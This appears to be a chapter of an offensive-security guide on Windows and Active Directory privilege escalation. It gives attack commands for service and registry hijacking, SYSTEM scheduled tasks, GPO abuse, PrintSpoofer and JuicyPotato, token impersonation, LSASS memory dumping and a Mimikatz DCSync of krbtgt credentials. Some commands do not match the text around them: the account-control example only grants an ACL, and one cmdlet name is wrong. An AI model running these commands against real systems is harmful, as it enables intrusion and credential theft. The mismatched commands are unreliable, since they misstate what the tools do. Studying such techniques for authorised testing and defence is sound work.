# Chapter 9: Privilege Escalation

Privilege escalation is the process of exploiting a bug, design flaw, or configuration oversight in an operating system or application to gain elevated access to resources that are normally protected from an application or user. In an Active Directory environment, privilege escalation is critical for moving from a low-privileged user to a Domain Admin or local administrator.

## Misconfigured Permissions

Misconfigured permissions are a common vector for privilege escalation. If a standard user has write access to sensitive objects or can execute privileged actions, they can elevate their privileges.

### Example: Modifying User Account Control (UAC)

If a user has `WriteProperty` access to the `userAccountControl` attribute of another user, they can add the `ADS_UF_DONT_EXPIRE_PASSWD` flag (0x10000) or set the user as a service account.

```powershell
# PowerShell (using PowerView)
Add-DomainObjectAcl -TargetIdentity <TargetUser> -PrincipalIdentity <AttackerUser> -Rights WriteProperty -TargetSearchBase "LDAP://DC=contoso,DC=com"
```

### Example: Modifying Group Memberships

If a user has `WriteMember` access to a privileged group (e.g., Domain Admins), they can add themselves to the group.

```powershell
# PowerShell (using PowerView)
Add-GroupMember -Identity "Domain Admins" -Members <AttackerUser>
```

## Service Abuse

Windows services run with specific privileges. If a service is misconfigured, it can be exploited to execute arbitrary code with the service's privileges (often SYSTEM or LOCAL SERVICE).

### Unquoted Service Paths

If a service binary path contains spaces and is not enclosed in quotes, Windows will attempt to execute files in the parent directories.

**Example:**
- Path: `C:\Program Files\My App\service.exe`
- Windows tries: `C:\Program.exe`, `C:\Program Files\My.exe`, `C:\Program Files\My App\service.exe`

### Weak Service Permissions

If a standard user has `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` permissions on a service, they can change the binary path to point to a malicious executable.

```cmd
# Command Prompt
sc config <ServiceName> binpath= "C:\temp\malicious.exe"
sc start <ServiceName>
```

### Weak Registry Permissions

If a user has write access to the registry key of a service (`HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`), they can modify the `ImagePath` value to execute a malicious binary.

```cmd
# Command Prompt
reg add HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName> /v ImagePath /t REG_EXPAND_SZ /d C:\temp\malicious.exe /f
```

## Scheduled Tasks

Scheduled tasks run with the privileges of the user who created them or a specified account. If a standard user can create or modify a scheduled task that runs as SYSTEM or an administrator, they can escalate privileges.

### Example: Creating a Scheduled Task

```powershell
# PowerShell
$Action = New-ScheduledTaskAction -Execute "C:\temp\malicious.exe"
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date)
Register-ScheduledTask -TaskName "Escalation" -Action $Action -Principal $Principal -Trigger $Trigger
```

## Weak ACLs (Access Control Lists)

Discretionary Access Control Lists (DACLs) define who can access an object and what actions they can perform. Weak DACLs on sensitive objects (e.g., computers, users, groups) can lead to privilege escalation.

### Example: Modifying Computer Attributes

If a user has `WriteProperty` access to a computer object, they can set the `msDS-AllowedToDelegateTo` attribute to enable constrained delegation, or modify the `servicePrincipalName` (SPN) for Kerberoasting.

```powershell
# PowerShell (using PowerView)
Set-DomainObject -Identity <ComputerName> -Set @{serviceprincipalname='MSSQLSvc/<ComputerName>:1433'}
```

## GPO Abuse

Group Policy Objects (GPOs) can be used to apply settings across the domain. If a user has write access to a GPO or can create a new GPO, they can apply malicious settings (e.g., scheduled tasks, startup scripts) to privileged users or computers.

### Example: Modifying a GPO

```powershell
# PowerShell (using PowerView)
New-GPOImmediateTask -TaskName "Escalation" -Command "C:\temp\malicious.exe" -GPOName "MaliciousGPO"
```

## SeImpersonatePrivilege

The `SeImpersonatePrivilege` allows a process to impersonate a client. This privilege is often granted to service accounts and local administrators.

### Juicy Potato / PrintSpoofer

If a process has `SeImpersonatePrivilege`, it can abuse named pipes or RPC endpoints to impersonate the SYSTEM user and spawn a new process with SYSTEM privileges.

```powershell
# PowerShell (using PrintSpoofer)
.\PrintSpoofer.exe -i -c cmd.exe
```

```cmd
# Command Prompt (using JuicyPotato)
JuicyPotato.exe -l 1337 -p C:\temp\malicious.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

## Token Abuse

Windows uses tokens to define the security context of a process. If an attacker can manipulate tokens, they can escalate privileges.

### Example: Impersonating SYSTEM

```powershell
# PowerShell (using Invoke-TokenManipulation)
Invoke-TokenManipulation -ImpersonateUser -Username "SYSTEM"
```

## Local Admin Escalation

If a user is a local administrator on a machine, they can dump LSASS memory to extract credentials, which can then be used for lateral movement or further escalation.

### Example: Dumping LSASS

```powershell
# PowerShell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```

## Domain Escalation

Domain escalation involves moving from a local administrator or service account to a Domain Admin. This often requires exploiting delegation, AD CS, or GPO abuse.

### Example: DCSync

If a user has `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions, they can simulate a Domain Controller and extract credentials using DCSync.

```powershell
# PowerShell (using Mimikatz)
mimikatz # lsadump::dcsync /domain:contoso.com /user:krbtgt
```

---
*Privilege escalation provides the necessary access to move laterally. The next chapter will explore the techniques used to move from the initial compromised host to other systems and the Domain Controller.*
